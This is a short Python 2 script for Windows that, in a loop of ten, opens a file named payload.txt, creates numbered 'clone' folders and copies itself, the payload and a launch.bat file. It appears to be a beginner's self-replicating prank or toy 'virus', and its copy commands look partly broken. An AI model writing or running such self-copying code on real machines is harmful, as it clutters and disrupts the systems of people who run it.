from sys import argv
import os

script=argv
name=str(script[0])
print name

cmd= 'start payload.txt'
for i in range(0,10):
    cmd= 'start payload.txt'
    os.system(cmd)
    os.mkdir('clone'+str(i))
    os.system(r"copy payload.txt clone")
    os.system(r"copy " + name + " clone")
    os.system(r"copy launch.bat clone")


